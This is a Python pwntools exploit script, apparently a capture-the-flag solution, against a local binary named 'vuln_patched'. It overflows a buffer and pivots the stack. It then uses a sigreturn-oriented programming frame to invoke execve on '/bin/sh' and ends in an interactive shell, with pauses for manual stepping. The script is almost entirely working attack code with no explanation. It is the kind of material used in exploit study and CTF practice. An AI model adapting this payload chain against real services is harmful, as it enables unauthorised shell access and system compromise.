#!/usr/bin/python3

from pwn import *

exe = ELF('vuln_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b*main+49

                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('')
else:
        p = process(exe.path)
base = 0x0000000000404500
GDB()
ret=0x000000000040101a
rw_section=0x404a00
payload=b"A"*8
payload+=flat(
    0x404020+8,
    0x401142,
)
p.sendline(payload)

frame=SigreturnFrame()
frame.rax=0x3b
frame.rdi=0x404000
frame.rsi=0
frame.rdx=0
frame.rip=exe.plt['syscall']
frame.rsp=exe.plt['syscall']
payload=flat(
    exe.plt['syscall'],0x404008,
    0x401142,
    bytes(frame)[0x10::]
)
input("ENTER TO SEND PAYLOAD 2")
p.send(payload)

payload=flat(
    b"/bin/sh\x00",
    0x404a00+8,
    ret,
    b"\x3b"
)
input("enter to send syscall")
p.send(payload)
input('send 0xf bytes')
sh=b"/bin/sh\x00"
sh=sh.ljust(0xf,b"A")
p.send(sh)

p.interactive()
